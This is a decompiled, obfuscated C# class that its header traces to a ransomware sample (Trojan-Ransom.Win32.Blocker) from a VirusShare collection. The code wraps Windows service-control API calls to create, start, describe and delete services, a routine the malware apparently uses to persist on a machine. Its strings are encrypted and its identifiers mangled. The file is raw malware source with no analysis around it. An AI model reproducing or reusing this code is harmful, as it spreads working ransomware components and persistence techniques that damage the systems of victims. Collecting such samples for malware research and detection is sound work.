// Decompiled with JetBrains decompiler
// Type: ?1?.?38?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B16D8A9B-E0EE-4C85-A3BA-4405997EF24D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.bgfw-a4892676fe7d1d73d3b37d39e1a1e9d1be41dca8bcf297ce0ddfed35c970d2b7.exe

using \u003F1\u003F;
using System;
using System.Runtime.InteropServices;

namespace \u003F1\u003F
{
  internal class \u003F38\u003F
  {
    [DllImport("advapi32.dll", EntryPoint = "OpenSCManager")]
    internal static extern IntPtr \u003F76\u003F(string _param0, string _param1, int _param2);

    [DllImport("Advapi32.dll", EntryPoint = "CreateService")]
    internal static extern IntPtr \u003F77\u003F(
      IntPtr _param0,
      string _param1,
      string _param2,
      int _param3,
      int _param4,
      int _param5,
      int _param6,
      string _param7,
      string _param8,
      int _param9,
      string _param10,
      string _param11,
      string _param12);

    [DllImport("advapi32.dll", EntryPoint = "CloseServiceHandle")]
    internal static extern void \u003F74\u003F(IntPtr _param0);

    [DllImport("advapi32.dll", EntryPoint = "StartService")]
    internal static extern int \u003F78\u003F(IntPtr _param0, int _param1, string _param2);

    [DllImport("advapi32.dll", EntryPoint = "OpenService", SetLastError = true)]
    internal static extern IntPtr \u003F79\u003F(IntPtr _param0, string _param1, int _param2);

    [DllImport("advapi32.dll", EntryPoint = "DeleteService")]
    internal static extern int \u003F80\u003F(IntPtr _param0);

    [DllImport("kernel32.dll", EntryPoint = "GetLastError")]
    internal static extern int \u003F81\u003F();

    internal static bool \u003F1\u003F(
      string _param0,
      string _param1,
      string _param2,
      bool _param3,
      bool _param4,
      string _param5,
      \u003F38\u003F.\u003F46\u003F _param6)
    {
      int num1 = 2;
      int num2 = 16;
      int num3 = 1;
      int num4 = 983040 | 1 | 2 | 4 | 8 | 16 | 32 | 64 | 128 | 256;
      try
      {
        IntPtr num5 = \u003F38\u003F.\u003F76\u003F((string) null, (string) null, num1);
        if (num5.ToInt32() != 0)
        {
          IntPtr num6 = \u003F38\u003F.\u003F77\u003F(num5, _param1, _param2, num4, num2, (int) _param6, num3, _param0, (string) null, 0, (string) null, (string) null, (string) null);
          if (num6.ToInt32() == 0)
          {
            \u003F38\u003F.\u003F15\u003F(\u003F57\u003F.\u003F1\u003F(1414225276, 2111292474, 864045930), _param4);
            \u003F38\u003F.\u003F74\u003F(num5);
          }
          else
          {
            if (_param5 != \u003F57\u003F.\u003F1\u003F(1619816194, 2111292474, 864045914) && !\u003F38\u003F.\u003F1\u003F(_param1, _param5))
              \u003F38\u003F.\u003F16\u003F(\u003F57\u003F.\u003F1\u003F(397647739, 2111292532, 864045848), _param4);
            if (_param3 && \u003F38\u003F.\u003F78\u003F(num6, 0, (string) null) == 0)
              \u003F38\u003F.\u003F16\u003F(\u003F57\u003F.\u003F1\u003F(358006898, 2111292490, 864045940), _param4);
            \u003F38\u003F.\u003F17\u003F(\u003F57\u003F.\u003F1\u003F(1375697822, 2111292558, 864045926), _param4);
            \u003F38\u003F.\u003F74\u003F(num5);
            return true;
          }
        }
        else
          \u003F38\u003F.\u003F15\u003F(\u003F57\u003F.\u003F1\u003F(1865746343, 2111292610, 864045846), _param4);
      }
      catch (Exception ex)
      {
        \u003F38\u003F.\u003F15\u003F(ex.ToString(), _param4);
      }
      return false;
    }

    internal static bool \u003F1\u003F(string _param0, bool _param1)
    {
      try
      {
        IntPtr num1 = \u003F38\u003F.\u003F76\u003F((string) null, (string) null, 1073741824);
        if (num1.ToInt32() != 0)
        {
          int num2 = 65536;
          IntPtr num3 = \u003F38\u003F.\u003F79\u003F(num1, _param0, num2);
          if (num3.ToInt32() != 0)
          {
            if (\u003F38\u003F.\u003F80\u003F(num3) != 0)
            {
              \u003F38\u003F.\u003F17\u003F(\u003F57\u003F.\u003F1\u003F(1345452346, 2111292704, 864045850), _param1);
              \u003F38\u003F.\u003F74\u003F(num1);
              return true;
            }
            \u003F38\u003F.\u003F15\u003F(\u003F57\u003F.\u003F1\u003F(772414821, 2111292782, 864045932), _param1);
            \u003F38\u003F.\u003F74\u003F(num1);
            return false;
          }
          \u003F38\u003F.\u003F15\u003F(\u003F57\u003F.\u003F1\u003F(1800469188, 2111292854, 864045922), _param1);
        }
        else
          \u003F38\u003F.\u003F15\u003F(\u003F57\u003F.\u003F1\u003F(1481646698, 2111292906, 864045846), _param1);
      }
      catch (Exception ex)
      {
        \u003F38\u003F.\u003F15\u003F(ex.ToString(), _param1);
      }
      return false;
    }

    internal static bool \u003F1\u003F(string _param0, string _param1)
    {
      if (_param1 == \u003F57\u003F.\u003F1\u003F(1729812048, 2111293152, 864045914))
        return true;
      int num1 = 0;
      int num2 = 0;
      int num3 = 0;
      \u003F1\u003F.\u003F1\u003F.\u003F28\u003F obj;
      obj.\u003F1\u003F = _param1;
      try
      {
        num1 = \u003F1\u003F.\u003F1\u003F.\u003F73\u003F((string) null, (string) null, \u003F1\u003F.\u003F1\u003F.\u003F22\u003F.\u003F20\u003F);
        if (num1 < 1)
          return false;
        num2 = \u003F1\u003F.\u003F1\u003F.\u003F67\u003F(num1);
        if (num2 < 1)
          return false;
        num3 = \u003F1\u003F.\u003F1\u003F.\u003F72\u003F(num1, _param0, \u003F1\u003F.\u003F1\u003F.\u003F23\u003F.\u003F23\u003F);
        return num3 >= 1 && \u003F1\u003F.\u003F1\u003F.\u003F71\u003F(num3, \u003F1\u003F.\u003F1\u003F.\u003F29\u003F.\u003F1\u003F, ref obj);
      }
      catch
      {
      }
      finally
      {
        if (num3 > 0)
          \u003F1\u003F.\u003F1\u003F.\u003F74\u003F(num3);
        if (num2 > 0)
          \u003F1\u003F.\u003F1\u003F.\u003F68\u003F(num2);
        if (num1 != 0)
          \u003F1\u003F.\u003F1\u003F.\u003F74\u003F(num1);
      }
      return false;
    }

    internal static void \u003F15\u003F(string _param0, bool _param1) => \u003F38\u003F.\u003F17\u003F(\u003F57\u003F.\u003F1\u003F(1647288214, 2111293152, 864045908) + _param0, _param1);

    internal static void \u003F16\u003F(string _param0, bool _param1) => \u003F38\u003F.\u003F17\u003F(\u003F57\u003F.\u003F1\u003F(1685272249, 2111293170, 864045896) + _param0, _param1);

    internal static void \u003F17\u003F(string _param0, bool _param1)
    {
      if (_param1)
        return;
      Console.WriteLine(_param0);
    }

    internal enum \u003F46\u003F
    {
      \u003F1\u003F = 2,
      \u003F15\u003F = 3,
    }
  }
}
